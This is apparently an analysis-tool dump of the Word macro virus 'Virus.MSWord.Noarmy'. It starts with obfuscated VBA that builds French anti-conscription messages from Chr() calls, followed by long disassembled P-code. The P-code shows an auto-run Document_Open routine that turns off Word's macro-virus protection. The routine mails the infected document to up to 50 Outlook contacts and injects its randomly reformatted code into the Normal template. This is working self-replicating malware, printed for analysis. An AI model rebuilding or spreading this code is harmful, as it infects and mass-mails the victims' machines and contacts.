Chr(32) + "service" + Chr(32) + "militaire." + Chr(32) + "250" _
+ Chr(32) _
+ "000" + Chr(32) + "étudiants," + Chr(32) + "salariés," + Chr(32) + "rêveurs," + Chr(32) ' iifjxvhpyvjiaz
c1 = c1 + "entrepreneurs," + _
Chr(32) + "chômeurs," + Chr(32) + "voyageurs" ' lkumnvsebq
b2 = Chr(32) + "ou" + Chr(32) + "tout" + Chr(32) + "simplement" + Chr(32) + "amoureux" + Chr(32) + "qui" + Chr(32) + "ont" + Chr(32) + "d" + Chr(39) + "autres" + Chr(32) + "projets" + Chr(32) + "de" + Chr(32) + "Vie" + Chr(32) ' dfnlvx
b2 = b2 + "pour" + Chr(32) + "ces" + Chr(32) + "10" + Chr(32) + "mois." + Chr(32) + "Ils" + Chr(32) + "refusent" + Chr(32) + "d" + Chr(39) + "effectuer" + Chr(32) + "un" + Chr(32) + "service" + Chr(32) + "inégalitaire" + Chr(32): b2 = _
b2 + "et" + Chr(32) + "dépassé," + Chr(32) + "bref" + Chr(32) + "un" + Chr(32) + "service" + Chr(32) + "qui" + Chr(32) + "ne" + Chr(32) + "sert" + Chr(32) + "plus" + Chr(32) + "rien.": b1 = "Mobilisons-nous" + Chr(32) + "!" + Chr(13) + Chr(13) + "Pétition" + Chr(32) + "pour" + Chr(32) + "les" + Chr(32) + "sursitaires" + Chr(32) + "sous" + Chr(32) + "contrat" + Chr(32) + "de" + Chr(32) + "travail:" ' tmvkicz
b1 = b1 + Chr(32) + "http://sn.agat.net" + Chr(13) + "La" + Chr(32) + "révolte" + Chr(32) + "du" + Chr(32) + _
"service" + Chr(32) + "militaire:" + Chr(32) + "http://altern.org/gigm/service.htm" + Chr(13): a1 = "La" + Chr(32) + "pétition" + Chr(32) + "du" + Chr(32) + "magazine" + Chr(32) + "Don" + Chr(32) + "Quichotte:" + Chr(32) + "http://www.donquichotte.com" + Chr(13) + _
"Non" + Chr(32) + "au" + Chr(32) + "S.N." ' wwwhoegm
a1 _
= a1 + Chr(32) + "qui" + Chr(32) + "tue" + _
Chr(32) + "l" + Chr(39) + "emploi:" + Chr(32) + "http://www.multimania.com/antisn": e4 = _
Chr(80) + _
Chr(114) + Chr(105) + Chr(118) + Chr(97) + _
Chr(116) + Chr(101): j17 = Chr(69) + Chr(110) + Chr(100) ' pzhkrbjnjvpiv
c7 = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98) ' cnwpxth
End Sub ' ozafjiz

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Noarmy
' ===============================================================================
' Module streams:
' Macros/VBA/NOSN - 44298 bytes
' Line #0:
' 	LineCont 0x0004 4A 00 00 00
' 	Dim 
' 	VarDefn h7
' 	VarDefn g8
' 	VarDefn j1
' 	VarDefn k2
' 	VarDefn j8
' 	VarDefn l1
' 	VarDefn m5
' 	VarDefn l8
' 	VarDefn a5
' 	VarDefn d3
' 	VarDefn g6
' 	VarDefn h3
' 	VarDefn k1
' 	VarDefn k5
' 	VarDefn g3
' 	VarDefn n6
' 	VarDefn h5
' 	VarDefn j5
' 	VarDefn k7
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn e8
' 	VarDefn b9
' 	VarDefn a7
' 	VarDefn d6
' 	VarDefn c5
' 	VarDefn e2
' 	VarDefn g1
' 	VarDefn l3
' 	VarDefn l9
' 	VarDefn n2
' 	VarDefn m1
' 	VarDefn h8
' 	VarDefn l5
' 	VarDefn i1
' 	VarDefn i7
' 	VarDefn e4
' 	VarDefn c7
' 	VarDefn c4
' 	VarDefn f3
' 	VarDefn h1
' 	VarDefn d8
' 	QuoteRem 0x000F 0x0009 " jhqqihma"
' Line #1:
' 	Dim 
' 	VarDefn g5
' 	VarDefn e1
' 	VarDefn m4
' 	VarDefn b3
' 	VarDefn d4
' 	VarDefn f7
' 	VarDefn i3
' 	VarDefn g2
' 	VarDefn e5
' 	VarDefn d2
' 	VarDefn a4
' 	VarDefn a3
' 	VarDefn a2
' 	VarDefn c2
' 	VarDefn d1
' 	VarDefn c3
' 	VarDefn c1
' 	VarDefn b2
' 	VarDefn b1
' 	VarDefn a1
' 	QuoteRem 0x0053 0x0005 " wzgl"
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' 	QuoteRem 0x0032 0x000B " pfuclghvxf"
' Line #3:
' 	ArgsCall (Call) f1 0x0000 
' 	BoS 0x0000 
' 	ArgsCall (Call) f2 0x0000 
' 	QuoteRem 0x0011 0x0007 " eetpsc"
' Line #4:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	Ld j1 
' 	Ld k2 
' 	Ld j8 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld j1 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x004E 0x0008 " ghyidbw"
' Line #5:
' 	LitDI4 0x0001 0x0000 
' 	Ld j1 
' 	Ld k2 
' 	Ld j8 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x002D 0x0006 " nolxk"
' Line #6:
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld m5 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	Ld m5 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	Ld m5 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0074 0x000E " davvpgpdtlfaf"
' Line #7:
' 	Ld a5 
' 	St d8 
' 	QuoteRem 0x0008 0x0009 " msgxlyud"
' Line #8:
' 	SetStmt 
' 	Ld d8 
' 	ArgsLd CreateObject 0x0001 
' 	Set c4 
' 	QuoteRem 0x001A 0x0010 " xmqxjsgfalofskn"
' Line #9:
' 	SetStmt 
' 	Ld l8 
' 	Ld c4 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set f3 
' 	QuoteRem 0x001D 0x0010 " nbyxwczqceotkiv"
' Line #10:
' 	Ld j1 
' 	Ld d3 
' 	Ld g6 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	SelectCase 
' 	QuoteRem 0x0034 0x000D " ztxoyoqarkpe"
' Line #11:
' 	Ld h3 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x000E 0x000C " kjyixkqhbyi"
' Line #12:
' 	Ld c4 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld k1 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld k5 
' 	Ld g3 
' 	Ld f3 
' 	ArgsMemCall Logon 0x0002 
' 	QuoteRem 0x0029 0x0007 " qcfnfb"
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld f3 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld i 
' 	Ld f3 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set g4 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld m5 
' 	Ld c4 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set h1 
' 	BoS 0x0000 
' 	Ld g4 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St h2 
' 	BoS 0x0000 
' 	Ld m5 
' 	St b6 
' 	QuoteRem 0x0083 0x0005 " bnaz"
' Line #14:
' 	LineCont 0x0004 04 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld h2 
' 	For 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld j 
' 	Ld g4 
' 	ArgsMemLd AddressEntries 0x0001 
' 	Set j2 
' 	BoS 0x0000 
' 	Ld j2 
' 	MemLd Address 
' 	FnLen 
' 	SelectCase 
' 	QuoteRem 0x0042 0x0005 " rkyt"
' Line #15:
' 	LineCont 0x0004 02 00 00 00
' 	LitDI2 0x0004 
' 	CaseGt 
' 	CaseDone 
' 	QuoteRem 0x0004 0x0009 " ujqqzysg"
' Line #16:
' 	Ld j2 
' 	MemLd Address 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	Ld j2 
' 	MemLd Address 
' 	Ld n6 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x0054 0x000D " pchlppmcnmgy"
' Line #17:
' 	Ld j2 
' 	Ld h1 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' 	QuoteRem 0x0015 0x0007 " smncyl"
' Line #18:
' 	Ld b6 
' 	LitDI2 0x0001 
' 	Add 
' 	St b6 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0018 0x000A " lasplbofh"
' Line #19:
' 	EndSelect 
' 	QuoteRem 0x000B 0x0008 " wkhfcjt"
' Line #20:
' 	Ld b6 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0032 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	ExitFor 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	QuoteRem 0x0049 0x000C " tpvucamfyjc"
' Line #21:
' 	LitR8 0x851F 0x51EB 0x1EB8 0x3FD5 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld h5 
' 	Ld h1 
' 	MemSt Subject 
' 	QuoteRem 0x0020 0x000B " yaumpzklsd"
' Line #22:
' 	Ld j5 
' 	Ld h1 
' 	MemSt Body 
' 	BoS 0x0000 
' 	LitR8 0x851F 0x51EB 0x1EB8 0x3FE5 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x001D 0x0008 " bttrryf"
' Line #23:
' 	Ld g1 
' 	Ld h1 
' 	MemSt Subject 
' 	BoS 0x0000 
' 	Ld l3 
' 	Ld h1 
' 	MemSt Body 
' 	BoS 0x0000 
' 	CaseElse 
' 	QuoteRem 0x0029 0x0008 " qqsweex"
' Line #24:
' 	Ld l9 
' 	Ld h1 
' 	MemSt Subject 
' 	BoS 0x0000 
' 	Ld n2 
' 	Ld h1 
' 	MemSt Body 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x002A 0x0010 " keflhuyodrfmhmc"
' Line #25:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld h1 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' 	QuoteRem 0x002B 0x000A " gkzwkielk"
' Line #26:
' 	LineCont 0x0004 16 00 00 00
' 	Ld h1 
' 	ArgsMemCall Send 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	Ld f3 
' 	ArgsMemCall Logoff 0x0000 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld h3 
' 	Ld j1 
' 	Ld d3 
' 	Ld g6 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x0009 0x000B " lxglxcacbo"
' Line #27:
' 	LineCont 0x0008 0D 00 00 00 1E 00 00 00
' 	EndSelect 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set n1 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld n1 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set i6 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set n1 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld n1 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set k3 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St i2 
' 	QuoteRem 0x0029 0x000C " myuycxcajww"
' Line #28:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld m1 
' 	FnInStr3 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld i6 
' 	MemLd New 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld g6 
' 	CaseNe 
' 	CaseDone 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld k3 
' 	Set b5 
' 	QuoteRem 0x006B 0x000F " mhxawbxeijlpda"
' Line #29:
' 	SetStmt 
' 	Ld i6 
' 	Set f5 
' 	QuoteRem 0x000C 0x0007 " mihpcj"
' Line #30:
' 	LitVarSpecial (True)
' 	St i2 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld k3 
' 	MemLd New 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld g6 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x0046 0x0009 " xyxtkkaa"
' Line #31:
' 	SetStmt 
' 	Ld i6 
' 	Set b5 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld k3 
' 	Set f5 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St i2 
' 	QuoteRem 0x0024 0x000A " qvqkahjys"
' Line #32:
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld i2 
' 	SelectCase 
' 	QuoteRem 0x001B 0x0005 " evrd"
' Line #33:
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000A 0x0006 " gyidk"
' Line #34:
' 	Ld b5 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	St i4 
' 	QuoteRem 0x0024 0x0005 " xtls"
' Line #35:
' 	Ld f5 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St c8 
' 	BoS 0x0000 
' 	Ld c8 
' 	SelectCase 
' 	QuoteRem 0x0030 0x000A " brshcdshk"
' Line #36:
' 	LitDI2 0x0000 
' 	CaseGt 
' 	CaseDone 
' 	QuoteRem 0x000C 0x0009 " qzmeryqa"
' Line #37:
' 	LitDI2 0x0001 
' 	Ld c8 
' 	Ld f5 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St c6 
' 	QuoteRem 0x0034 0x0005 " ipgn"
' Line #38:
' 	LitStr 0x0000 ""
' 	St c9 
' 	QuoteRem 0x0008 0x000E " fmhrchrmaozmo"
' Line #39:
' 	LitStr 0x0000 ""
' 	St j3 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St a6 
' 	QuoteRem 0x0010 0x0007 " cyqoxc"
' Line #40:
' 	LineCont 0x0004 02 00 00 00
' 	StartForVariable 
' 	Ld l2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i4 
' 	For 
' 	BoS 0x0000 
' 	Ld l2 
' 	LitDI2 0x0001 
' 	Ld b5 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St h4 
' 	QuoteRem 0x002B 0x000D " jfxypjhpkyvi"
' Line #41:
' 	LitDI2 0x0001 
' 	St i 
' 	QuoteRem 0x0006 0x0007 " eivduk"
' Line #42:
' 	LitDI2 0x0001 
' 	Ld h4 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St f4 
' 	QuoteRem 0x001B 0x0009 " orziswkb"
' Line #43:
' 	Ld f4 
' 	SelectCase 
' 	QuoteRem 0x000F 0x000E " chyleczoneldw"
' Line #44:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0007 0x0006 " dodbv"
' Line #45:
' 	Ld h4 
' 	FnLen 
' 	St f4 
' 	BoS 0x0000 
' 	CaseElse 
' 	QuoteRem 0x0018 0x000E " osbsfbrkttsee"
' Line #46:
' 	Ld f4 
' 	LitDI2 0x0002 
' 	Sub 
' 	St f4 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0018 0x0009 " scjcdnhw"
' Line #47:
' 	Do 
' 	BoS 0x0000 
' 	Ld i 
' 	Ld h4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St j 
' 	QuoteRem 0x001E 0x000D " ujpdxversouw"
' Line #48:
' 	Ld j 
' 	SelectCase 
' 	QuoteRem 0x000E 0x0007 " prlfxb"
' Line #49:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0007 0x0008 " xrisakg"
' Line #50:
' 	LineCont 0x0004 07 00 00 00
' 	Ld h4 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St b8 
' 	BoS 0x0000 
' 	Ld f4 
' 	LitDI2 0x0001 
' 	Add 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St b8 
' 	BoS 0x0000 
' 	CaseElse 
' 	QuoteRem 0x0030 0x000D " jxsygrfdauvr"
' Line #51:
' 	LitVarSpecial (False)
' 	St b8 
' 	QuoteRem 0x000B 0x0009 " fgwxfmsy"
' Line #52:
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld h4 
' 	Ld i 
' 	Ld j 
' 	Ld i 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St n5 
' 	BoS 0x0000 
' 	Ld b8 
' 	SelectCase 
' 	QuoteRem 0x0033 0x0006 " nqfzq"
' Line #53:
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld l2 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld b5 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St f6 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld f6 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St k4 
' 	BoS 0x0000 
' 	Ld k4 
' 	SelectCase 
' 	QuoteRem 0x005B 0x000E " qenclaqgsdorw"
' Line #54:
' 	LineCont 0x0004 04 00 00 00
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St j3 
' 	QuoteRem 0x0005 0x000F " xcoicibsmrkryk"
' Line #55:
' 	CaseElse 
' 	QuoteRem 0x000A 0x000E " yqfzztijrotcz"
' Line #56:
' 	Ld f6 
' 	LitDI2 0x0001 
' 	Ld k4 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St j3 
' 	QuoteRem 0x0018 0x0005 " tnhz"
' Line #57:
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0017 0x000C " dnujjmhcttk"
' Line #58:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld n5 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld k7 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld e8 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n5 
' 	BoS 0x0000 
' 	Ld e8 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld k7 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n5 
' 	QuoteRem 0x0035 0x0006 " yodlx"
' Line #59:
' 	Ld k7 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0008 0x0008 " fthgwcd"
' Line #60:
' 	Ld e8 
' 	St n5 
' 	BoS 0x0000 
' 	Ld e8 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld k7 
' 	St n5 
' 	QuoteRem 0x001A 0x0010 " tzrapjwlmlqjgsi"
' Line #61:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000E " sodclmwonyrvy"
' Line #62:
' 	Ld h6 
' 	SelectCase 
' 	QuoteRem 0x000F 0x000E " ctmqdolrcnizo"
' Line #63:
' 	LitVarSpecial (False)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	QuoteRem 0x001E 0x000E " aqevmrwmrbfdx"
' Line #64:
' 	LitR8 0x147B 0x47AE 0x7AE1 0x3F94 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x000F 0x0007 " caecjt"
' Line #65:
' 	LitVarSpecial (True)
' 	St h6 
' 	QuoteRem 0x000A 0x0009 " duagmvum"
' Line #66:
' 	CaseElse 
' 	QuoteRem 0x000A 0x000F " jclbrissqrebsl"
' Line #67:
' 	LitVarSpecial (False)
' 	St h6 
' 	QuoteRem 0x000B 0x0008 " idgczfi"
' Line #68:
' 	Ld b8 
' 	SelectCase 
' 	QuoteRem 0x000F 0x000A " hgbecjnlh"
' Line #69:
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000A 0x0010 " ifztwfesplsxamt"
' Line #70:
' 	Ld l2 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld i4 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0018 0x0009 " mjbpjmrg"
' Line #71:
' 	LitVarSpecial (True)
' 	St h6 
' 	QuoteRem 0x000A 0x0006 " nfiih"
' Line #72:
' 	EndSelect 
' 	QuoteRem 0x000B 0x0007 " liwovm"
' Line #73:
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	QuoteRem 0x0012 0x000C " lviolyevlsq"
' Line #74:
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x000E 0x0006 " twkle"
' Line #75:
' 	LitVarSpecial (True)
' 	St h6 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld j3 
' 	SelectCase 
' 	QuoteRem 0x0026 0x000F " lutfpcpmlrxsqt"
' Line #76:
' 	Ld e4 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0008 0x0005 " csqg"
' Line #77:
' 	LitVarSpecial (True)
' 	St h6 
' 	BoS 0x0000 
' 	Ld a6 
' 	LitDI2 0x0001 
' 	Add 
' 	St a6 
' 	BoS 0x0000 
' 	Ld a6 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld i4 
' 	St l2 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0050 0x0008 " ahidtqc"
' Line #78:
' 	LineCont 0x0004 12 00 00 00
' 	LitDI2 0x0001 
' 	Ld h4 
' 	Ld c7 
' 	FnInStr3 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld n5 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld j17 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000D 0x000E " gihngyrstkmab"
' Line #79:
' 	LineCont 0x0004 02 00 00 00
' 	LitVarSpecial (False)
' 	St h6 
' 	BoS 0x0000 
' 	CaseElse 
' 	QuoteRem 0x0011 0x0009 " wgskquvd"
' Line #80:
' 	LitVarSpecial (True)
' 	St h6 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0022 0x0005 " hkqz"
' Line #81:
' 	EndSelect 
' 	QuoteRem 0x000B 0x0006 " objkd"
' Line #82:
' 	EndSelect 
' 	QuoteRem 0x000B 0x0007 " xllzlv"
' Line #83:
' 	Ld n5 
' 	FnLen 
' 	SelectCase 
' 	QuoteRem 0x0014 0x0007 " wdaepf"
' Line #84:
' 	LineCont 0x0008 02 00 00 00 0E 00 00 00
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld n5 
' 	FnLen 
' 	Ld n5 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	SelectCase 
' 	QuoteRem 0x000D 0x0008 " vwndqjy"
' Line #85:
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x000D 0x000B " ljywvzwbvq"
' Line #86:
' 	LineCont 0x0004 08 00 00 00
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x0006 0x000E " vyfjauowzmbyg"
' Line #87:
' 	LineCont 0x0004 01 00 00 00
' 	LitVarSpecial (True)
' 	St h6 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0013 0x000F " sdfurmlnowjquv"
' Line #88:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000A " vnskzbkre"
' Line #89:
' 	EndSelect 
' 	QuoteRem 0x000B 0x0010 " hyxhqvtnvwufuzo"
' Line #90:
' 	CaseElse 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St h6 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0022 0x000C " eswqddwbypc"
' Line #91:
' 	Ld b8 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld n5 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0038 0x0006 " nxmdw"
' Line #92:
' 	LineCont 0x0004 25 00 00 00
' 	Ld c9 
' 	Ld h6 
' 	LitVarSpecial (True)
' 	Eq 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Ld h6 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld j1 
' 	ArgsLd Switch 0x0004 
' 	Add 
' 	St c9 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St j4 
' 	BoS 0x0000 
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld c9 
' 	Ld h6 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld n5 
' 	Ld h6 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd Switch 0x0004 
' 	Add 
' 	St c9 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St j4 
' 	QuoteRem 0x0039 0x000B " edvnvldagr"
' Line #93:
' 	EndSelect 
' 	QuoteRem 0x000B 0x0007 " uymuaa"
' Line #94:
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld n5 
' 	FnLen 
' 	Ld n5 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	SelectCase 
' 	QuoteRem 0x0033 0x000F " brdgeobbhwoodr"
' Line #95:
' 	LineCont 0x0004 0E 00 00 00
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld c9 
' 	Ld h6 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld h6 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd Switch 0x0004 
' 	Add 
' 	St c9 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St j4 
' 	QuoteRem 0x003B 0x0005 " gwhj"
' Line #96:
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld c9 
' 	Ld h6 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x0001 
' 	Ld n5 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld h6 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd Switch 0x0004 
' 	Add 
' 	St c9 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St j4 
' 	QuoteRem 0x0065 0x000D " owhdmndgkcrl"
' Line #97:
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld h6 
' 	SelectCase 
' 	QuoteRem 0x0027 0x0006 " cctsx"
' Line #98:
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld j4 
' 	SelectCase 
' 	QuoteRem 0x001A 0x000B " nptwswtqjg"
' Line #99:
